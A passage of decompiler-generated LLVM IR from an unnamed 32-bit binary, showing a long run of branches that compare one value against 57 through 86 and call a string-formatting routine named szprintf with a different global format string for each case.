  %v0_804a8e6 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a8e6 = zext i8 %v0_804a8e6 to i32
  %v2_804a8f5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8f5, i32* @ebx, align 4
  %v4_804a907 = call i32 @szprintf(i32 %v2_804a8f5, i32 ptrtoint ([14 x i8]* @global_var_8059559.85 to i32), i32 %v1_804a8e6)
  br label %dec_label_pc_804a90c

dec_label_pc_804a90c:                             ; preds = %dec_label_pc_804a8d6, %dec_label_pc_804a8dc
  %v13_804a90c = icmp eq i32 %v2_8049ce5, 57
  %v1_804a910 = icmp eq i1 %v13_804a90c, false
  br i1 %v1_804a910, label %dec_label_pc_804a942, label %dec_label_pc_804a912

dec_label_pc_804a912:                             ; preds = %dec_label_pc_804a90c
  %v0_804a912 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a912 = zext i8 %v0_804a912 to i32
  store i32 %v1_804a912, i32* @edx, align 4
  %v0_804a91c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a91c = zext i8 %v0_804a91c to i32
  %v2_804a92b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a92b, i32* @ebx, align 4
  %v4_804a93d = call i32 @szprintf(i32 %v2_804a92b, i32 ptrtoint ([13 x i8]* @global_var_8059567.86 to i32), i32 %v1_804a91c)
  br label %dec_label_pc_804a942

dec_label_pc_804a942:                             ; preds = %dec_label_pc_804a90c, %dec_label_pc_804a912
  %v13_804a942 = icmp eq i32 %v2_8049ce5, 58
  %v1_804a946 = icmp eq i1 %v13_804a942, false
  br i1 %v1_804a946, label %dec_label_pc_804a978, label %dec_label_pc_804a948

dec_label_pc_804a948:                             ; preds = %dec_label_pc_804a942
  %v0_804a948 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a948 = zext i8 %v0_804a948 to i32
  store i32 %v1_804a948, i32* @edx, align 4
  %v0_804a952 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a952 = zext i8 %v0_804a952 to i32
  %v2_804a961 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a961, i32* @ebx, align 4
  %v4_804a973 = call i32 @szprintf(i32 %v2_804a961, i32 ptrtoint ([13 x i8]* @global_var_8059574.87 to i32), i32 %v1_804a952)
  br label %dec_label_pc_804a978

dec_label_pc_804a978:                             ; preds = %dec_label_pc_804a942, %dec_label_pc_804a948
  %v13_804a978 = icmp eq i32 %v2_8049ce5, 59
  %v1_804a97c = icmp eq i1 %v13_804a978, false
  br i1 %v1_804a97c, label %dec_label_pc_804a9ae, label %dec_label_pc_804a97e

dec_label_pc_804a97e:                             ; preds = %dec_label_pc_804a978
  %v0_804a97e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a97e = zext i8 %v0_804a97e to i32
  store i32 %v1_804a97e, i32* @edx, align 4
  %v0_804a988 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a988 = zext i8 %v0_804a988 to i32
  %v2_804a997 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a997, i32* @ebx, align 4
  %v4_804a9a9 = call i32 @szprintf(i32 %v2_804a997, i32 ptrtoint ([13 x i8]* @global_var_8059581.88 to i32), i32 %v1_804a988)
  br label %dec_label_pc_804a9ae

dec_label_pc_804a9ae:                             ; preds = %dec_label_pc_804a978, %dec_label_pc_804a97e
  %v13_804a9ae = icmp eq i32 %v2_8049ce5, 60
  %v1_804a9b2 = icmp eq i1 %v13_804a9ae, false
  br i1 %v1_804a9b2, label %dec_label_pc_804a9e4, label %dec_label_pc_804a9b4

dec_label_pc_804a9b4:                             ; preds = %dec_label_pc_804a9ae
  %v0_804a9b4 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a9b4 = zext i8 %v0_804a9b4 to i32
  store i32 %v1_804a9b4, i32* @edx, align 4
  %v0_804a9be = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a9be = zext i8 %v0_804a9be to i32
  %v2_804a9cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9cd, i32* @ebx, align 4
  %v4_804a9df = call i32 @szprintf(i32 %v2_804a9cd, i32 ptrtoint ([13 x i8]* @global_var_805958e.89 to i32), i32 %v1_804a9be)
  br label %dec_label_pc_804a9e4

dec_label_pc_804a9e4:                             ; preds = %dec_label_pc_804a9ae, %dec_label_pc_804a9b4
  %v13_804a9e4 = icmp eq i32 %v2_8049ce5, 61
  %v1_804a9e8 = icmp eq i1 %v13_804a9e4, false
  br i1 %v1_804a9e8, label %dec_label_pc_804aa1a, label %dec_label_pc_804a9ea

dec_label_pc_804a9ea:                             ; preds = %dec_label_pc_804a9e4
  %v0_804a9ea = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a9ea = zext i8 %v0_804a9ea to i32
  store i32 %v1_804a9ea, i32* @edx, align 4
  %v0_804a9f4 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a9f4 = zext i8 %v0_804a9f4 to i32
  %v2_804aa03 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa03, i32* @ebx, align 4
  %v4_804aa15 = call i32 @szprintf(i32 %v2_804aa03, i32 ptrtoint ([13 x i8]* @global_var_805959b.90 to i32), i32 %v1_804a9f4)
  br label %dec_label_pc_804aa1a

dec_label_pc_804aa1a:                             ; preds = %dec_label_pc_804a9e4, %dec_label_pc_804a9ea
  %v13_804aa1a = icmp eq i32 %v2_8049ce5, 62
  %v1_804aa1e = icmp eq i1 %v13_804aa1a, false
  br i1 %v1_804aa1e, label %dec_label_pc_804aa50, label %dec_label_pc_804aa20

dec_label_pc_804aa20:                             ; preds = %dec_label_pc_804aa1a
  %v0_804aa20 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804aa20 = zext i8 %v0_804aa20 to i32
  store i32 %v1_804aa20, i32* @edx, align 4
  %v0_804aa2a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804aa2a = zext i8 %v0_804aa2a to i32
  %v2_804aa39 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa39, i32* @ebx, align 4
  %v4_804aa4b = call i32 @szprintf(i32 %v2_804aa39, i32 ptrtoint ([13 x i8]* @global_var_80595a8.91 to i32), i32 %v1_804aa2a)
  br label %dec_label_pc_804aa50

dec_label_pc_804aa50:                             ; preds = %dec_label_pc_804aa1a, %dec_label_pc_804aa20
  %v13_804aa50 = icmp eq i32 %v2_8049ce5, 63
  %v1_804aa54 = icmp eq i1 %v13_804aa50, false
  br i1 %v1_804aa54, label %dec_label_pc_804aa86, label %dec_label_pc_804aa56

dec_label_pc_804aa56:                             ; preds = %dec_label_pc_804aa50
  %v0_804aa56 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804aa56 = zext i8 %v0_804aa56 to i32
  store i32 %v1_804aa56, i32* @edx, align 4
  %v0_804aa60 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804aa60 = zext i8 %v0_804aa60 to i32
  %v2_804aa6f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa6f, i32* @ebx, align 4
  %v4_804aa81 = call i32 @szprintf(i32 %v2_804aa6f, i32 ptrtoint ([13 x i8]* @global_var_80595b5.92 to i32), i32 %v1_804aa60)
  br label %dec_label_pc_804aa86

dec_label_pc_804aa86:                             ; preds = %dec_label_pc_804aa50, %dec_label_pc_804aa56
  %v10_804aa86 = icmp eq i32 %v2_8049ce5, 64
  %v1_804aa8a = icmp eq i1 %v10_804aa86, false
  br i1 %v1_804aa8a, label %dec_label_pc_804aabc, label %dec_label_pc_804aa8c

dec_label_pc_804aa8c:                             ; preds = %dec_label_pc_804aa86
  %v0_804aa8c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804aa8c = zext i8 %v0_804aa8c to i32
  store i32 %v1_804aa8c, i32* @edx, align 4
  %v0_804aa96 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804aa96 = zext i8 %v0_804aa96 to i32
  %v2_804aaa5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aaa5, i32* @ebx, align 4
  %v4_804aab7 = call i32 @szprintf(i32 %v2_804aaa5, i32 ptrtoint ([13 x i8]* @global_var_80595c2.93 to i32), i32 %v1_804aa96)
  br label %dec_label_pc_804aabc

dec_label_pc_804aabc:                             ; preds = %dec_label_pc_804aa86, %dec_label_pc_804aa8c
  %v13_804aabc = icmp eq i32 %v2_8049ce5, 65
  %v1_804aac0 = icmp eq i1 %v13_804aabc, false
  br i1 %v1_804aac0, label %dec_label_pc_804aaf2, label %dec_label_pc_804aac2

dec_label_pc_804aac2:                             ; preds = %dec_label_pc_804aabc
  %v0_804aac2 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804aac2 = zext i8 %v0_804aac2 to i32
  store i32 %v1_804aac2, i32* @edx, align 4
  %v0_804aacc = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804aacc = zext i8 %v0_804aacc to i32
  %v2_804aadb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aadb, i32* @ebx, align 4
  %v4_804aaed = call i32 @szprintf(i32 %v2_804aadb, i32 ptrtoint ([13 x i8]* @global_var_80595cf.94 to i32), i32 %v1_804aacc)
  br label %dec_label_pc_804aaf2

dec_label_pc_804aaf2:                             ; preds = %dec_label_pc_804aabc, %dec_label_pc_804aac2
  %v13_804aaf2 = icmp eq i32 %v2_8049ce5, 66
  %v1_804aaf6 = icmp eq i1 %v13_804aaf2, false
  br i1 %v1_804aaf6, label %dec_label_pc_804ab28, label %dec_label_pc_804aaf8

dec_label_pc_804aaf8:                             ; preds = %dec_label_pc_804aaf2
  %v0_804aaf8 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804aaf8 = zext i8 %v0_804aaf8 to i32
  store i32 %v1_804aaf8, i32* @edx, align 4
  %v0_804ab02 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ab02 = zext i8 %v0_804ab02 to i32
  %v2_804ab11 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab11, i32* @ebx, align 4
  %v4_804ab23 = call i32 @szprintf(i32 %v2_804ab11, i32 ptrtoint ([13 x i8]* @global_var_80595dc.95 to i32), i32 %v1_804ab02)
  br label %dec_label_pc_804ab28

dec_label_pc_804ab28:                             ; preds = %dec_label_pc_804aaf2, %dec_label_pc_804aaf8
  %v13_804ab28 = icmp eq i32 %v2_8049ce5, 67
  %v1_804ab2c = icmp eq i1 %v13_804ab28, false
  br i1 %v1_804ab2c, label %dec_label_pc_804ab5e, label %dec_label_pc_804ab2e

dec_label_pc_804ab2e:                             ; preds = %dec_label_pc_804ab28
  %v0_804ab2e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ab2e = zext i8 %v0_804ab2e to i32
  store i32 %v1_804ab2e, i32* @edx, align 4
  %v0_804ab38 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ab38 = zext i8 %v0_804ab38 to i32
  %v2_804ab47 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab47, i32* @ebx, align 4
  %v4_804ab59 = call i32 @szprintf(i32 %v2_804ab47, i32 ptrtoint ([13 x i8]* @global_var_80595e9.96 to i32), i32 %v1_804ab38)
  br label %dec_label_pc_804ab5e

dec_label_pc_804ab5e:                             ; preds = %dec_label_pc_804ab28, %dec_label_pc_804ab2e
  %v13_804ab5e = icmp eq i32 %v2_8049ce5, 68
  %v1_804ab62 = icmp eq i1 %v13_804ab5e, false
  br i1 %v1_804ab62, label %dec_label_pc_804ab94, label %dec_label_pc_804ab64

dec_label_pc_804ab64:                             ; preds = %dec_label_pc_804ab5e
  %v0_804ab64 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ab64 = zext i8 %v0_804ab64 to i32
  store i32 %v1_804ab64, i32* @edx, align 4
  %v0_804ab6e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ab6e = zext i8 %v0_804ab6e to i32
  %v2_804ab7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab7d, i32* @ebx, align 4
  %v4_804ab8f = call i32 @szprintf(i32 %v2_804ab7d, i32 ptrtoint ([13 x i8]* @global_var_80595f6.97 to i32), i32 %v1_804ab6e)
  br label %dec_label_pc_804ab94

dec_label_pc_804ab94:                             ; preds = %dec_label_pc_804ab5e, %dec_label_pc_804ab64
  %v13_804ab94 = icmp eq i32 %v2_8049ce5, 69
  %v1_804ab98 = icmp eq i1 %v13_804ab94, false
  br i1 %v1_804ab98, label %dec_label_pc_804abca, label %dec_label_pc_804ab9a

dec_label_pc_804ab9a:                             ; preds = %dec_label_pc_804ab94
  %v0_804ab9a = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ab9a = zext i8 %v0_804ab9a to i32
  store i32 %v1_804ab9a, i32* @edx, align 4
  %v0_804aba4 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804aba4 = zext i8 %v0_804aba4 to i32
  %v2_804abb3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abb3, i32* @ebx, align 4
  %v4_804abc5 = call i32 @szprintf(i32 %v2_804abb3, i32 ptrtoint ([13 x i8]* @global_var_8059603.98 to i32), i32 %v1_804aba4)
  br label %dec_label_pc_804abca

dec_label_pc_804abca:                             ; preds = %dec_label_pc_804ab94, %dec_label_pc_804ab9a
  %v13_804abca = icmp eq i32 %v2_8049ce5, 70
  %v1_804abce = icmp eq i1 %v13_804abca, false
  br i1 %v1_804abce, label %dec_label_pc_804ac00, label %dec_label_pc_804abd0

dec_label_pc_804abd0:                             ; preds = %dec_label_pc_804abca
  %v0_804abd0 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804abd0 = zext i8 %v0_804abd0 to i32
  store i32 %v1_804abd0, i32* @edx, align 4
  %v0_804abda = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804abda = zext i8 %v0_804abda to i32
  %v2_804abe9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abe9, i32* @ebx, align 4
  %v4_804abfb = call i32 @szprintf(i32 %v2_804abe9, i32 ptrtoint ([13 x i8]* @global_var_8059610.99 to i32), i32 %v1_804abda)
  br label %dec_label_pc_804ac00

dec_label_pc_804ac00:                             ; preds = %dec_label_pc_804abca, %dec_label_pc_804abd0
  %v13_804ac00 = icmp eq i32 %v2_8049ce5, 71
  %v1_804ac04 = icmp eq i1 %v13_804ac00, false
  br i1 %v1_804ac04, label %dec_label_pc_804ac36, label %dec_label_pc_804ac06

dec_label_pc_804ac06:                             ; preds = %dec_label_pc_804ac00
  %v0_804ac06 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ac06 = zext i8 %v0_804ac06 to i32
  store i32 %v1_804ac06, i32* @edx, align 4
  %v0_804ac10 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ac10 = zext i8 %v0_804ac10 to i32
  %v2_804ac1f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac1f, i32* @ebx, align 4
  %v4_804ac31 = call i32 @szprintf(i32 %v2_804ac1f, i32 ptrtoint ([13 x i8]* @global_var_805961d.100 to i32), i32 %v1_804ac10)
  br label %dec_label_pc_804ac36

dec_label_pc_804ac36:                             ; preds = %dec_label_pc_804ac00, %dec_label_pc_804ac06
  %v13_804ac36 = icmp eq i32 %v2_8049ce5, 72
  %v1_804ac3a = icmp eq i1 %v13_804ac36, false
  br i1 %v1_804ac3a, label %dec_label_pc_804ac6c, label %dec_label_pc_804ac3c

dec_label_pc_804ac3c:                             ; preds = %dec_label_pc_804ac36
  %v0_804ac3c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ac3c = zext i8 %v0_804ac3c to i32
  store i32 %v1_804ac3c, i32* @edx, align 4
  %v0_804ac46 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ac46 = zext i8 %v0_804ac46 to i32
  %v2_804ac55 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac55, i32* @ebx, align 4
  %v4_804ac67 = call i32 @szprintf(i32 %v2_804ac55, i32 ptrtoint ([13 x i8]* @global_var_805962a.101 to i32), i32 %v1_804ac46)
  br label %dec_label_pc_804ac6c

dec_label_pc_804ac6c:                             ; preds = %dec_label_pc_804ac36, %dec_label_pc_804ac3c
  %v13_804ac6c = icmp eq i32 %v2_8049ce5, 73
  %v1_804ac70 = icmp eq i1 %v13_804ac6c, false
  br i1 %v1_804ac70, label %dec_label_pc_804aca2, label %dec_label_pc_804ac72

dec_label_pc_804ac72:                             ; preds = %dec_label_pc_804ac6c
  %v0_804ac72 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ac72 = zext i8 %v0_804ac72 to i32
  store i32 %v1_804ac72, i32* @edx, align 4
  %v0_804ac7c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ac7c = zext i8 %v0_804ac7c to i32
  %v2_804ac8b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac8b, i32* @ebx, align 4
  %v4_804ac9d = call i32 @szprintf(i32 %v2_804ac8b, i32 ptrtoint ([13 x i8]* @global_var_8059637.102 to i32), i32 %v1_804ac7c)
  br label %dec_label_pc_804aca2

dec_label_pc_804aca2:                             ; preds = %dec_label_pc_804ac6c, %dec_label_pc_804ac72
  %v13_804aca2 = icmp eq i32 %v2_8049ce5, 74
  %v1_804aca6 = icmp eq i1 %v13_804aca2, false
  br i1 %v1_804aca6, label %dec_label_pc_804acd8, label %dec_label_pc_804aca8

dec_label_pc_804aca8:                             ; preds = %dec_label_pc_804aca2
  %v0_804aca8 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804aca8 = zext i8 %v0_804aca8 to i32
  store i32 %v1_804aca8, i32* @edx, align 4
  %v0_804acb2 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804acb2 = zext i8 %v0_804acb2 to i32
  %v2_804acc1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acc1, i32* @ebx, align 4
  %v4_804acd3 = call i32 @szprintf(i32 %v2_804acc1, i32 ptrtoint ([13 x i8]* @global_var_8059644.103 to i32), i32 %v1_804acb2)
  br label %dec_label_pc_804acd8

dec_label_pc_804acd8:                             ; preds = %dec_label_pc_804aca2, %dec_label_pc_804aca8
  %v13_804acd8 = icmp eq i32 %v2_8049ce5, 75
  %v1_804acdc = icmp eq i1 %v13_804acd8, false
  br i1 %v1_804acdc, label %dec_label_pc_804ad0e, label %dec_label_pc_804acde

dec_label_pc_804acde:                             ; preds = %dec_label_pc_804acd8
  %v0_804acde = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804acde = zext i8 %v0_804acde to i32
  store i32 %v1_804acde, i32* @edx, align 4
  %v0_804ace8 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ace8 = zext i8 %v0_804ace8 to i32
  %v2_804acf7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acf7, i32* @ebx, align 4
  %v4_804ad09 = call i32 @szprintf(i32 %v2_804acf7, i32 ptrtoint ([13 x i8]* @global_var_8059651.104 to i32), i32 %v1_804ace8)
  br label %dec_label_pc_804ad0e

dec_label_pc_804ad0e:                             ; preds = %dec_label_pc_804acd8, %dec_label_pc_804acde
  %v13_804ad0e = icmp eq i32 %v2_8049ce5, 76
  %v1_804ad12 = icmp eq i1 %v13_804ad0e, false
  br i1 %v1_804ad12, label %dec_label_pc_804ad44, label %dec_label_pc_804ad14

dec_label_pc_804ad14:                             ; preds = %dec_label_pc_804ad0e
  %v0_804ad14 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ad14 = zext i8 %v0_804ad14 to i32
  store i32 %v1_804ad14, i32* @edx, align 4
  %v0_804ad1e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ad1e = zext i8 %v0_804ad1e to i32
  %v2_804ad2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad2d, i32* @ebx, align 4
  %v4_804ad3f = call i32 @szprintf(i32 %v2_804ad2d, i32 ptrtoint ([13 x i8]* @global_var_805965e.105 to i32), i32 %v1_804ad1e)
  br label %dec_label_pc_804ad44

dec_label_pc_804ad44:                             ; preds = %dec_label_pc_804ad0e, %dec_label_pc_804ad14
  %v13_804ad44 = icmp eq i32 %v2_8049ce5, 77
  %v1_804ad48 = icmp eq i1 %v13_804ad44, false
  br i1 %v1_804ad48, label %dec_label_pc_804ad7a, label %dec_label_pc_804ad4a

dec_label_pc_804ad4a:                             ; preds = %dec_label_pc_804ad44
  %v0_804ad4a = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ad4a = zext i8 %v0_804ad4a to i32
  store i32 %v1_804ad4a, i32* @edx, align 4
  %v0_804ad54 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ad54 = zext i8 %v0_804ad54 to i32
  %v2_804ad63 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad63, i32* @ebx, align 4
  %v4_804ad75 = call i32 @szprintf(i32 %v2_804ad63, i32 ptrtoint ([13 x i8]* @global_var_805966b.106 to i32), i32 %v1_804ad54)
  br label %dec_label_pc_804ad7a

dec_label_pc_804ad7a:                             ; preds = %dec_label_pc_804ad44, %dec_label_pc_804ad4a
  %v13_804ad7a = icmp eq i32 %v2_8049ce5, 78
  %v1_804ad7e = icmp eq i1 %v13_804ad7a, false
  br i1 %v1_804ad7e, label %dec_label_pc_804adb0, label %dec_label_pc_804ad80

dec_label_pc_804ad80:                             ; preds = %dec_label_pc_804ad7a
  %v0_804ad80 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ad80 = zext i8 %v0_804ad80 to i32
  store i32 %v1_804ad80, i32* @edx, align 4
  %v0_804ad8a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ad8a = zext i8 %v0_804ad8a to i32
  %v2_804ad99 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad99, i32* @ebx, align 4
  %v4_804adab = call i32 @szprintf(i32 %v2_804ad99, i32 ptrtoint ([13 x i8]* @global_var_8059678.107 to i32), i32 %v1_804ad8a)
  br label %dec_label_pc_804adb0

dec_label_pc_804adb0:                             ; preds = %dec_label_pc_804ad7a, %dec_label_pc_804ad80
  %v13_804adb0 = icmp eq i32 %v2_8049ce5, 79
  %v1_804adb4 = icmp eq i1 %v13_804adb0, false
  br i1 %v1_804adb4, label %dec_label_pc_804ade6, label %dec_label_pc_804adb6

dec_label_pc_804adb6:                             ; preds = %dec_label_pc_804adb0
  %v0_804adb6 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804adb6 = zext i8 %v0_804adb6 to i32
  store i32 %v1_804adb6, i32* @edx, align 4
  %v0_804adc0 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804adc0 = zext i8 %v0_804adc0 to i32
  %v2_804adcf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adcf, i32* @ebx, align 4
  %v4_804ade1 = call i32 @szprintf(i32 %v2_804adcf, i32 ptrtoint ([13 x i8]* @global_var_8059685.108 to i32), i32 %v1_804adc0)
  br label %dec_label_pc_804ade6

dec_label_pc_804ade6:                             ; preds = %dec_label_pc_804adb0, %dec_label_pc_804adb6
  %v10_804ade6 = icmp eq i32 %v2_8049ce5, 80
  %v1_804adea = icmp eq i1 %v10_804ade6, false
  br i1 %v1_804adea, label %dec_label_pc_804ae1c, label %dec_label_pc_804adec

dec_label_pc_804adec:                             ; preds = %dec_label_pc_804ade6
  %v0_804adec = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804adec = zext i8 %v0_804adec to i32
  store i32 %v1_804adec, i32* @edx, align 4
  %v0_804adf6 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804adf6 = zext i8 %v0_804adf6 to i32
  %v2_804ae05 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae05, i32* @ebx, align 4
  %v4_804ae17 = call i32 @szprintf(i32 %v2_804ae05, i32 ptrtoint ([13 x i8]* @global_var_8059692.109 to i32), i32 %v1_804adf6)
  br label %dec_label_pc_804ae1c

dec_label_pc_804ae1c:                             ; preds = %dec_label_pc_804ade6, %dec_label_pc_804adec
  %v13_804ae1c = icmp eq i32 %v2_8049ce5, 81
  %v1_804ae20 = icmp eq i1 %v13_804ae1c, false
  br i1 %v1_804ae20, label %dec_label_pc_804ae52, label %dec_label_pc_804ae22

dec_label_pc_804ae22:                             ; preds = %dec_label_pc_804ae1c
  %v0_804ae22 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ae22 = zext i8 %v0_804ae22 to i32
  store i32 %v1_804ae22, i32* @edx, align 4
  %v0_804ae2c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ae2c = zext i8 %v0_804ae2c to i32
  %v2_804ae3b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae3b, i32* @ebx, align 4
  %v4_804ae4d = call i32 @szprintf(i32 %v2_804ae3b, i32 ptrtoint ([13 x i8]* @global_var_805969f.110 to i32), i32 %v1_804ae2c)
  br label %dec_label_pc_804ae52

dec_label_pc_804ae52:                             ; preds = %dec_label_pc_804ae1c, %dec_label_pc_804ae22
  %v13_804ae52 = icmp eq i32 %v2_8049ce5, 82
  %v1_804ae56 = icmp eq i1 %v13_804ae52, false
  br i1 %v1_804ae56, label %dec_label_pc_804ae88, label %dec_label_pc_804ae58

dec_label_pc_804ae58:                             ; preds = %dec_label_pc_804ae52
  %v0_804ae58 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ae58 = zext i8 %v0_804ae58 to i32
  store i32 %v1_804ae58, i32* @edx, align 4
  %v0_804ae62 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ae62 = zext i8 %v0_804ae62 to i32
  %v2_804ae71 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae71, i32* @ebx, align 4
  %v4_804ae83 = call i32 @szprintf(i32 %v2_804ae71, i32 ptrtoint ([13 x i8]* @global_var_80596ac.111 to i32), i32 %v1_804ae62)
  br label %dec_label_pc_804ae88

dec_label_pc_804ae88:                             ; preds = %dec_label_pc_804ae52, %dec_label_pc_804ae58
  %v13_804ae88 = icmp eq i32 %v2_8049ce5, 83
  %v1_804ae8c = icmp eq i1 %v13_804ae88, false
  br i1 %v1_804ae8c, label %dec_label_pc_804aebe, label %dec_label_pc_804ae8e

dec_label_pc_804ae8e:                             ; preds = %dec_label_pc_804ae88
  %v0_804ae8e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ae8e = zext i8 %v0_804ae8e to i32
  store i32 %v1_804ae8e, i32* @edx, align 4
  %v0_804ae98 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ae98 = zext i8 %v0_804ae98 to i32
  %v2_804aea7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aea7, i32* @ebx, align 4
  %v4_804aeb9 = call i32 @szprintf(i32 %v2_804aea7, i32 ptrtoint ([13 x i8]* @global_var_80596b9.112 to i32), i32 %v1_804ae98)
  br label %dec_label_pc_804aebe

dec_label_pc_804aebe:                             ; preds = %dec_label_pc_804ae88, %dec_label_pc_804ae8e
  %v13_804aebe = icmp eq i32 %v2_8049ce5, 84
  %v1_804aec2 = icmp eq i1 %v13_804aebe, false
  br i1 %v1_804aec2, label %dec_label_pc_804aef4, label %dec_label_pc_804aec4

dec_label_pc_804aec4:                             ; preds = %dec_label_pc_804aebe
  %v0_804aec4 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804aec4 = zext i8 %v0_804aec4 to i32
  store i32 %v1_804aec4, i32* @edx, align 4
  %v0_804aece = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804aece = zext i8 %v0_804aece to i32
  %v2_804aedd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aedd, i32* @ebx, align 4
  %v4_804aeef = call i32 @szprintf(i32 %v2_804aedd, i32 ptrtoint ([13 x i8]* @global_var_80596c6.113 to i32), i32 %v1_804aece)
  br label %dec_label_pc_804aef4

dec_label_pc_804aef4:                             ; preds = %dec_label_pc_804aebe, %dec_label_pc_804aec4
  %v13_804aef4 = icmp eq i32 %v2_8049ce5, 85
  %v1_804aef8 = icmp eq i1 %v13_804aef4, false
  br i1 %v1_804aef8, label %dec_label_pc_804af2a, label %dec_label_pc_804aefa

dec_label_pc_804aefa:                             ; preds = %dec_label_pc_804aef4
  %v0_804aefa = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804aefa = zext i8 %v0_804aefa to i32
  store i32 %v1_804aefa, i32* @edx, align 4
  %v0_804af04 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804af04 = zext i8 %v0_804af04 to i32
  %v2_804af13 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af13, i32* @ebx, align 4
  %v4_804af25 = call i32 @szprintf(i32 %v2_804af13, i32 ptrtoint ([13 x i8]* @global_var_80596d3.114 to i32), i32 %v1_804af04)
  br label %dec_label_pc_804af2a

dec_label_pc_804af2a:                             ; preds = %dec_label_pc_804aef4, %dec_label_pc_804aefa
  %v13_804af2a = icmp eq i32 %v2_8049ce5, 86
  %v1_804af2e = icmp eq i1 %v13_804af2a, false
  br i1 %v1_804af2e, label %dec_label_pc_804af60, label %dec_label_pc_804af30

dec_label_pc_804af30:                             ; preds = %dec_label_pc_804af2a
  %v0_804af30 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804af30 = zext i8 %v0_804af30 to i32
  store i32 %v1_804af30, i32* @edx, align 4
  %v0_804af3a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804af3a = zext i8 %v0_804af3a to i32
  %v2_804af49 = ptrtoint i32* %stack_var_-28 to i32
